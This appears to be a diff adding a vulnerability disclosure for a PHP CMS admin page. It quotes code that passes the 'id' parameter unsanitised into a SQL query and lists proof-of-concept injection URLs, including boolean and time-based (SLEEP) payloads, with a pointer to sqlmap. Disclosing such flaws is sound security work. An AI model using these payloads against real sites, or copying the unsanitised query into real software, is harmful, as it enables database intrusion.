@@ -1,0 +1,25 @@
+affected source code file: /admin/news/news_mod.php
+--------------------------------
+affected source code:
+  .....
+    <?php
+        session_start();
+        require '../session.php'; include '../../inc/const.php';
+        include '../../inc/editor/fckeditor.php';
+        $id= getvar('id');
+        $list = $db->getOneRow(get_sql("select * from {pre}content where id = " . $id));
+    ?>
+     .....
+
+--------------------------------
+affected reason:
+      We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/news/news_mod.php
+--------------------------------
+affected executable: 
+  Like this: 
+             http://127.0.0.1/cms/5/admin/news/news_mod.php?id=1'
+             http://127.0.0.1/cms/5/admin/news/news_mod.php?id=1 and 1=1
+             http://127.0.0.1/cms/5/admin/news/news_mod.php?id=1 and 1=2
+             http://127.0.0.1/cms/5/admin/news/news_mod.php?id=1 RLIKE SLEEP(2)
+             
+Then, we can use tools like sqlmap for more information.
